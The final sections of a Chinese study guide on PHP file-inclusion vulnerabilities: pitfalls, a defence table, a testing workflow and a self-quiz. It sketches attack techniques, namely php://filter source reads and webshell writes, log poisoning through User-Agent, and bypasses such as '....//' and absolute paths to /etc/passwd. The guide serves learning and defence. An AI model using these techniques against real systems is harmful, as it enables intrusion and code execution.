> - SRC 复盘：`https://mp.weixin.qq.com/s/hMUDDgRSPY6ybznYBRZ20Q`
> - 公开练习站：`http://testphp.vulnweb.com/showimage.php?file=index.php`（Acunetix 的公开靶站，可自己动手试包含）

### 7.4 易错点 🟡 重要 —— 卡住时先排查这几条

- **把"没打成功"当成"没有洞"**：`http://` 无效、`php://input` 无效，最常见原因是 `allow_url_include=Off` 或过滤，不是没有包含点。按 §5 的前提表排查。
- **漏写扩展名**：`resource=config` 和 `resource=config.php` 是两个不同的文件，`php://filter` 不会替你补后缀。
- **把"空白"当成"读不到"**：`resource=xxx.php` 返回空白，往往是它**被执行了但没输出**——这恰好是"能执行"的证据，不是"读不到"。
- **写文件不看目录权限**：payload 再对，目录不可写也落不了盘；先找 `/tmp`、上传目录、缓存目录。
- **base64 前后缀乱加**：前缀不是 4 的倍数会让整串错位（§5.6 ①），不是"多加几个字符更保险"。
- **日志读到了却没执行**：日志里的代码可能被转义（`<` → `&lt;`），换 `Referer` / `X-Forwarded-For` / 请求路径再试。

## 8. 防御与检测 🟡 重要 —— 知道怎么修,才知道还能从哪绕

| 攻击手法 | 正确防御 | 为什么"简单过滤"不够 |
|---|---|---|
| 直接包含任意路径 | **白名单映射**：用户输入只能是"键"（`cn`/`en`），真实文件名写死在代码里 | 只过滤 `../` → 可用绝对路径 `/etc/passwd` 绕过；或 `....//`（删除一次 `../` 后拼回 `../`） |
| `php://filter` 读源码 | 限制协议：只允许固定目录内的相对路径，或 `open_basedir` | 只封 `http`/`data` → `php://` 照样能读 |
| `php://input` / `data://` 执行 | `allow_url_include=Off`（默认值，别开） | —— |
| 日志 / session 被包含 | Web 用户**不可读**日志与 session 目录；日志目录独立权限 | 日志总要写，只要路径可猜、权限放开，就仍然可被包含 |
| 配合上传的马被执行 | 上传目录**禁止执行**；文件重命名 | 只改后缀 → 包含漏洞仍然能强制执行它（见 §4.1） |
| 绕过编码/二次解码 | 统一在"规范化路径"后做白名单判断，不要做字符黑名单 | 反斜杠、URL 编码、`.....//`、大小写等多形态绕法无穷 |

> **一句话防御**：**别让用户的输入进路径**（白名单映射），配合 `open_basedir` + `allow_url_include=Off` + 日志/session 不可读 + 上传目录禁执行。**黑名单式过滤（过滤 `../`、过滤 `php`）永远修不干净**——这就是 CTF 里 87/88/117 关一直在考的东西。

## 9. 把它串起来：文件包含测试思维

**先用 5 条复述出骨架**（复述不出来，说明还没吃透，回对应章节）：

1. **漏洞根因**：用户输入进了 `include` 的路径 → 数据越界成"被执行的文件"（§1）。
2. **能打哪种打法**，由**代码过滤 + 环境开关**决定：`allow_url_include` / `open_basedir` / 读写权限（§1.3、§5 前提表）。
3. **`php://filter` 是主武器**：`read=` 读源码、`write=` 落 shell，`base64` / `rot13` / `iconv` 三种编码器用来绕内容过滤（§5.2、§5.6）。
4. **从"读"到"执行"要有一个可控文件**：上传马、日志、session、伪协议四条路（§4）。
5. **报告定级看**"读到什么值钱的"和"能不能 RCE"，不是看能不能读 `/etc/passwd`（§7.3）。

```
① 找到嫌疑参数（§3.1：file/page/lang/tpl/mod...）
        ↓
② 确认它是"包含"还是"读文件"（§3.3 步骤1：包含自身看是否被执行）
        ↓
③ 确认路径基准（§3.3 步骤2：../ 层数、绝对路径、读 /etc/passwd）
        ↓
④ 先试最稳的：php://filter/read=base64 读源码  → 拿到 config/源码/路径信息
        ↓
⑤ 问一句"能不能执行"：
   ├─ allow_url_include=On → php://input / data:// 直接 RCE（§5.3）
   ├─ 能写文件目录 → php://filter/write + base64/rot13/iconv 落地 shell（§5.2）
   ├─ 能上传 → 上传图片马 + 包含它（§4.1）
   └─ 都不行 → 日志包含（§4.2，最常用）/ session 竞争（§4.3）
        ↓
⑥ 影响证明：读到什么值钱的（§7.3）→ 报告按资产写影响
        ↓
⑦ 复测：确认修复方式是"白名单"还是"加了个黑名单"（后者往往还能绕）
```

## 10. 自测（先自己想，再看答案）

1. 为什么说"文件包含漏洞是把'能读一个文件'变成'执行任意代码'的杠杆"？说出两条不同的转化路径。
2. `?file=php://filter/read=convert.base64-encode/resource=config.php` 里，`convert.base64-encode` 到底解决了什么问题？不加会怎样？
3. 日志包含为什么要用 `User-Agent` 塞代码，而不是直接放在 URL 参数里？
4. 目标 `allow_url_include=Off`、也没有上传点，你手上还有哪些路可以走？
5. 用 `php://filter/write=convert.base64-decode` 写 shell 时，body 为什么不是 `<?php eval(...);?>` 而是它的 base64？如果顺手在前面加了 `aa` 会发生什么？

<details>
<summary>参考答案</summary>

1. 因为包含漏洞本身不直接给权限，它放大的是"服务器上已有的、内容可控的文件"：① 那个文件**本身含 PHP 代码**（上传的图片马、被写入代码的日志/session），包含它 = 代码执行；② 那个文件**不含代码**（`/etc/passwd`、`config.php`），用 `php://filter` 把内容编码输出，就变成**任意文件读取** → 读到数据库口令/源码 → 进一步拿权限。同理它也是"文件上传传上去了但不能执行"的解决方案。
2. 它解决"包含 php 文件时源码会被当代码执行、看不到内容"的问题：过滤器在文件内容被交给 PHP 解析之前先把它 base64 编码，页面输出的是 base64 字符串，解码即源码。不加的话，`resource=config.php` 会被当代码执行——要么报错、要么静默无输出，你拿不到源码。
3. 因为 URL 里的特殊字符（`<`、`?`、空格、`/`）会被 URL 编码成 `%3C`、`%3F` 等，写进日志后**已经不是能执行的 PHP 代码了**；而 `User-Agent`（以及 `Referer`、`X-Forwarded-For`）是原样写进日志的请求头，塞进去的代码原文就落在日志文件里。
4. 至少三条：① `php://filter/read=base64` 读源码/配置（不需要 `allow_url_include`），找数据库口令、后台路径、其他可写目录；② 日志包含（UA/Referer 注入 + 包含 `/var/log/nginx/access.log`）；③ SESSION 包含 + 条件竞争（`PHP_SESSION_UPLOAD_PROGRESS`）；④ 如果找到**任何**可写目录，可用 `php://filter/write=` 直接落 shell（也不需要 `allow_url_include`）。
5. 因为内容过滤通常会拦"内容里出现 `<?php`、`eval`、`system`"的请求；发 base64 过去，过滤看到的是无害字符串，落盘时才被 `convert.base64-decode` 过滤器还原成 PHP 代码。前面加 `aa` 会把 base64 流按 4 字符一组的解码**错位**（2 个字符不是 4 的倍数），结果是落盘空文件（PHP 报 invalid byte sequence）或乱码——前缀必须是 4 的倍数或干脆不加（本机 PHP 7.3.4 实测）。

</details>

## 11. 待核实 / 存疑

- **87 关 base64 写文件 payload 的 `aa` 前缀**：本机 PHP 7.3.4 实测"`aa`+完整 base64（含 `==`）"会写入失败（`invalid byte sequence`，文件为空），"无前缀"或"4 字符前缀"才成功。原笔记的写法可能来自**不同 PHP 版本**或**`=` 被过滤后的变体**。**以你在靶场上实际能写出文件为准**；若失败，优先试无前缀 / 4 字符前缀。
- **CTFSHOW 各关的实际过滤规则**：我**没有**登录靶场逐关验证（题面/环境可能已改版），表格里的"考点"依据原笔记与常见解题思路整理，payload 我只核对了**解码结果与语法正确性**（base64、rot13、iconv 三条均已实测/核对）。
- **`convert.base64-decode` 的版本差异**：PHP 8 对过滤器输入更严格，老版本更宽松（"忽略非法字符继续解码"），所以同一 payload 在不同版本上表现可能不同。**验证环境版本**这件事在写 filter 利用时很关键。
- **原笔记引用的外部资料未核实**：CSDN / 博客园 / 微信文章链接（原笔记给出）我未逐一打开核对内容；`testphp.vulnweb.com` 为 Acunetix 公开靶站，可用于自测。
- **`allow_url_include` 现状**：PHP 手册标注为 `INI_SYSTEM`、默认 `"0"`、**自 PHP 7.4.0 起标记为 deprecated**、自 5.2 起默认关闭（已核实官方手册 `ini.list.php`）。但"某个具体版本上是否已被移除"各版本不同，部署前查该版本手册。
